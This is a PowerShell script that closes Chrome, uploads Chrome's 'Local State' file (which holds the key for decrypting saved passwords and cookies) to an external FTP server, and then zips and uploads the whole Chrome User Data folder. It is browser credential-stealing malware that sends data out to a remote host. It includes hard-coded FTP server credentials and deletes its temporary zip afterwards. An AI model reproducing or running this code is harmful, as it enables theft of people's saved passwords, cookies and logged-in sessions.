# Close Chrome before running the script
try {
    Stop-Process -Name "chrome" -Force -ErrorAction Stop
    Write-Host "Chrome has been closed."
} catch {
    Write-Host "Chrome was not running."
}

# FTP server details
$FTP_HOST = "us-east-1.sftpcloud.io"
$FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
$FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'

# New Paths
$local_state_path = [Environment]::ExpandEnvironmentVariables("C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State")
$user_data_path = [Environment]::ExpandEnvironmentVariables("C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data")

# Function to compress the User Data directory
function Compress-UserData {
    param (
        [String]$sourceDir,
        [String]$destinationZip
    )
    if (-not (Test-Path $sourceDir)) {
        Write-Host "Source directory does not exist."
        return $false
    }

    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($sourceDir, $destinationZip)
    return $true
}

# FTP function to upload files, now including ability to handle ZIP files
function Upload-ToFtp {
    param (
        [String]$file_path,
        [String]$file_name
    )
    # Load Assembly and create FTPWebRequest to /Cookies directory for consistency
    $ftpUrl = "ftp://$FTP_HOST/Cookies/$file_name"
    Add-Type -AssemblyName System.Net
    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftpRequest.UseBinary = $true
    $ftpRequest.KeepAlive = $false

    # Read file content
    $content = [System.IO.File]::ReadAllBytes($file_path)
    $ftpRequest.ContentLength = $content.Length

    # Get request stream and upload the file
    $requestStream = $ftpRequest.GetRequestStream()
    $requestStream.Write($content, 0, $content.Length)
    $requestStream.Close()

    Write-Host "Uploaded $file_name to FTP in /Cookies."
}

# Upload Local State file
if (Test-Path $local_state_path) {
    $file_name = [System.IO.Path]::GetFileName($local_state_path)
    Upload-ToFtp -file_path $local_state_path -file_name $file_name
} else {
    Write-Host "Local State file does not exist."
}

# Compress and Upload User Data directory
$user_data_zip_path = "C:\temp_chrome_user_data.zip"
$compressionResult = Compress-UserData -sourceDir $user_data_path -destinationZip $user_data_zip_path

if ($compressionResult) {
    $zip_file_name = [System.IO.Path]::GetFileName($user_data_zip_path)
    Upload-ToFtp -file_path $user_data_zip_path -file_name $zip_file_name
    Remove-Item -Path $user_data_zip_path # Clean up the ZIP file after uploading
} else {
    Write-Host "Failed to compress User Data directory."
}
